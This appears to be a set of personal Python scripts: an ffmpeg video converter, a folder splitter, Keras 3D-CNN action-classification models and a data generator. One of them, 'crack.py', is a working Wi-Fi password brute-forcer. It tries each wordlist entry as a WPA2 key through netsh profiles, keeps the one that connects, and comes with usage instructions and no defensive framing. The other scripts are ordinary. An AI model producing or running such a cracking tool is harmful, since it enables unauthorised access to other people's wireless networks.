````python
import os
import subprocess

def is_ffmpeg_installed():
    try:
        subprocess.run(["ffmpeg", "-version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        return True
    except FileNotFoundError:
        return False

def convert_videos_to_mp4(input_folder, output_folder):
    if not os.path.exists(output_folder):
        os.makedirs(output_folder)
    
    for filename in os.listdir(input_folder):
        input_path = os.path.join(input_folder, filename)
        output_path = os.path.join(output_folder, os.path.splitext(filename)[0] + ".mp4")
        
        if os.path.isfile(input_path):
            if os.path.exists(output_path):
                print(f"Skipping: {filename} (already converted)")
                continue
            
            if filename.lower().endswith(".mp4"):
                try:
                    os.rename(input_path, output_path)
                    print(f"Copied: {filename} -> {output_path}")
                except Exception as e:
                    print(f"Error moving {filename}: {e}")
            else:
                command = [
                    "ffmpeg", "-hwaccel", "cuda", "-i", input_path,
                    "-c:v", "copy",  # Copy video without re-encoding
                    "-c:a", "copy",  # Copy audio without re-encoding
                    "-movflags", "+faststart",  # Optimize MP4 for streaming
                    output_path
                ]
                
                try:
                    subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, check=True)
                    print(f"Converted: {filename} -> {output_path}")
                except FileNotFoundError:
                    print("Error: FFmpeg is not installed or not in system PATH.")
                except subprocess.CalledProcessError as e:
                    print(f"Error converting {filename}: {e.stderr.decode(errors='ignore')}")
                except Exception as e:
                    print(f"Unexpected error processing {filename}: {e}")

if __name__ == "__main__":
    base_input_folder = r"C:\Users\Raymond\Desktop\New folder" 
    base_output_folder = r"C:\Users\Raymond\Desktop\New folder2" 
    
    if not os.path.exists(base_input_folder):
        print(f"Error: Input folder {base_input_folder} does not exist.")
    else:
        subfolders = [os.path.join(base_input_folder, d) for d in os.listdir(base_input_folder) if os.path.isdir(os.path.join(base_input_folder, d))]
        
        if subfolders:
            for input_folder in subfolders:
                relative_subfolder = os.path.relpath(input_folder, base_input_folder)
                output_folder = os.path.join(base_output_folder, relative_subfolder)
                convert_videos_to_mp4(input_folder, output_folder)
        else:
            convert_videos_to_mp4(base_input_folder, base_output_folder)
````

````python
import os
import shutil
import math

def split_videos_into_subfolders(input_folder, num_subfolders=20):
    if not os.path.exists(input_folder):
        print(f"Error: Input folder {input_folder} does not exist.")
        return
    
    video_files = [f for f in os.listdir(input_folder) if os.path.isfile(os.path.join(input_folder, f))]
    num_videos = len(video_files)
    videos_per_folder = math.ceil(num_videos / num_subfolders)
    
    for i in range(num_subfolders):
        subfolder_path = os.path.join(input_folder, f"subfolder_{i+1}")
        if not os.path.exists(subfolder_path):
            os.makedirs(subfolder_path)
        
        start_index = i * videos_per_folder
        end_index = min(start_index + videos_per_folder, num_videos)
        
        for video in video_files[start_index:end_index]:
            src_path = os.path.join(input_folder, video)
            dest_path = os.path.join(subfolder_path, video)
            shutil.move(src_path, dest_path)
            print(f"Moved: {video} -> {subfolder_path}")

# Example usage
input_folder = r"D:\Recordings\Splitted_Videos - Copy"
split_videos_into_subfolders(input_folder)
````

````python
# how to use:
# python crack.py -s <SSID> -w <wordlist.txt>
# py .\crack.py -s "Raymond" -w .\wordlist.txt 

import subprocess
import sys
import time

def windows_wifi_bruteforce(ssid, wordlist_path):
    try:
        with open(wordlist_path, 'r') as f:
            passwords = f.read().splitlines()
    except FileNotFoundError:
        print(f"Error: File {wordlist_path} not found.")
        return

    print(f"[*] Targeting Wi-Fi: {ssid}")
    
    for idx, password in enumerate(passwords, 1):
        print(f"\rAttempt {idx}/{len(passwords)}: {password}", end="", flush=True)
        
        # Create XML profile
        profile_xml = f'''<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{ssid}</name>
    <SSIDConfig>
        <SSID><hex>{ssid.encode().hex()}</hex><name>{ssid}</name></SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>manual</connectionMode>
    <MSM>
        <security>
            <authEncryption><authentication>WPA2PSK</authentication><encryption>AES</encryption></authEncryption>
            <sharedKey><keyType>passPhrase</keyType><protected>false</protected><keyMaterial>{password}</keyMaterial></sharedKey>
        </security>
    </MSM>
</WLANProfile>'''
        
        # Save temporary profile
        with open("temp_profile.xml", "w") as f:
            f.write(profile_xml)
        
        # Add profile to Windows
        add_profile_cmd = f'netsh wlan add profile filename="temp_profile.xml"'
        result_add = subprocess.run(add_profile_cmd, shell=True, capture_output=True, text=True)
        
        if "is added on interface" not in result_add.stdout:
            print(f"\n[-] Failed to add profile for password: {password}")
            continue
        
        # Attempt connection
        connect_cmd = f'netsh wlan connect name="{ssid}"'
        result_connect = subprocess.run(connect_cmd, shell=True, capture_output=True, text=True)
        time.sleep(1)
        
        # Check connection status
        status_cmd = 'netsh wlan show interfaces | findstr "State"'
        result_status = subprocess.run(status_cmd, shell=True, capture_output=True, text=True)
        
        if "connected" in result_status.stdout.lower():
            print(f"\n[+] Success! Password: {password}")
            print(f"[*] Profile for '{ssid}' has been saved permanently")
            return  # Exit without deleting the profile
    
    print("\n[-] Password not found in the list.")

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Windows Wi-Fi Tester (Keeps Successful Profile)")
    parser.add_argument("-s", "--ssid", required=True, help="Wi-Fi SSID")
    parser.add_argument("-w", "--wordlist", required=True, help="Path to password wordlist")
    args = parser.parse_args()

    windows_wifi_bruteforce(args.ssid, args.wordlist)
````

````python
import tensorflow as tf
from tensorflow.keras.models import Model
from tensorflow.keras.layers import Input, Conv3D, MaxPooling3D, Flatten, Dense, BatchNormalization, Dropout, Concatenate, TimeDistributed

# Define model architecture
def build_action_classifier(video_shape=(30, 64, 64, 3), pose_shape=(30, 132), num_classes=3):

    video_input = Input(shape=video_shape, name="video_input")
    x = Conv3D(32, (3, 3, 3), activation='relu', padding='same')(video_input)
    x = BatchNormalization()(x)
    x = MaxPooling3D((2, 2, 2))(x)

    x = Conv3D(64, (3, 3, 3), activation='relu', padding='same')(x)
    x = BatchNormalization()(x)
    x = MaxPooling3D((2, 2, 2))(x)

    x = Conv3D(128, (3, 3, 3), activation='relu', padding='same')(x)
    x = BatchNormalization()(x)
    x = MaxPooling3D((2, 2, 2))(x)

    x = Flatten()(x)  # shape: (None, N)

    #  Pose Input (Dense Layers per frame using TimeDistributed)
    pose_input = Input(shape=pose_shape, name="pose_input")
    y = TimeDistributed(Dense(64, activation='relu'))(pose_input)
    y = Flatten()(y)  # now shape is (None, N)

    #  Merge Features
    merged = Concatenate()([x, y])
    merged = Dense(256, activation='relu')(merged)
    merged = Dropout(0.5)(merged)
    output = Dense(num_classes, activation='softmax')(merged)

    model = tf.keras.Model(inputs=[video_input, pose_input], outputs=output)
    model.compile(optimizer='adam', loss='categorical_crossentropy', metrics=['accuracy'])
    return model

# Initialize model
model = build_action_classifier()
model.summary()
````

````python
import os
import numpy as np
import tensorflow as tf
from tensorflow.keras.utils import Sequence, to_categorical
from sklearn.preprocessing import LabelEncoder

class VideoDataGenerator(Sequence):
    def __init__(self, folder_path, class_labels, batch_size=8, shuffle=True):
        self.folder_path = folder_path
        self.class_labels = class_labels
        self.batch_size = batch_size
        self.shuffle = shuffle

        # Collect all video paths and corresponding labels
        self.file_paths = []
        self.labels = []

        for label in class_labels:
            class_folder = os.path.join(folder_path, label)
            for fname in os.listdir(class_folder):
                if fname.endswith('.npy'):
                    self.file_paths.append(os.path.join(class_folder, fname))
                    self.labels.append(label)

        # Encode labels once
        self.encoder = LabelEncoder()
        self.encoded_labels = to_categorical(self.encoder.fit_transform(self.labels))

        # Index array for shuffling
        self.indices = np.arange(len(self.file_paths))
        if self.shuffle:
            np.random.shuffle(self.indices)

    def __len__(self):
        return int(np.ceil(len(self.file_paths) / self.batch_size))

    def __getitem__(self, index):
        # Get batch indices
        batch_indices = self.indices[index * self.batch_size:(index + 1) * self.batch_size]

        # Load batch data
        batch_videos = []
        batch_labels = []

        for i in batch_indices:
            video = np.load(self.file_paths[i]) / 255.0  # Normalize
            label = self.encoded_labels[i]

            batch_videos.append(video)
            batch_labels.append(label)

        return np.array(batch_videos), np.array(batch_labels)

    def on_epoch_end(self):
        if self.shuffle:
            np.random.shuffle(self.indices)
````

````python
from tensorflow.keras.models import Model
from tensorflow.keras.layers import Input, Conv3D, MaxPooling3D, Flatten, Dense, BatchNormalization, Dropout

IMG_SIZE = 128
FRAMES = 24
CHANNELS = 3

def build_3d_cnn(input_shape=(FRAMES, IMG_SIZE, IMG_SIZE, CHANNELS), num_classes=2):
    inputs = Input(shape=input_shape)

    x = Conv3D(32, (3, 3, 3), activation='relu', padding='same')(inputs)
    x = BatchNormalization()(x)
    x = MaxPooling3D((2, 2, 2))(x)

    x = Conv3D(64, (3, 3, 3), activation='relu', padding='same')(x)
    x = BatchNormalization()(x)
    x = MaxPooling3D((2, 2, 2))(x)

    x = Conv3D(128, (3, 3, 3), activation='relu', padding='same')(x)
    x = BatchNormalization()(x)
    x = MaxPooling3D((2, 2, 2))(x)

    x = Flatten()(x)
    x = Dense(256, activation='relu')(x)
    x = Dropout(0.5)(x)
    outputs = Dense(num_classes, activation='softmax')(x)

    model = Model(inputs, outputs)
    model.compile(optimizer='adam', loss='categorical_crossentropy', metrics=['accuracy'])
    return model
````
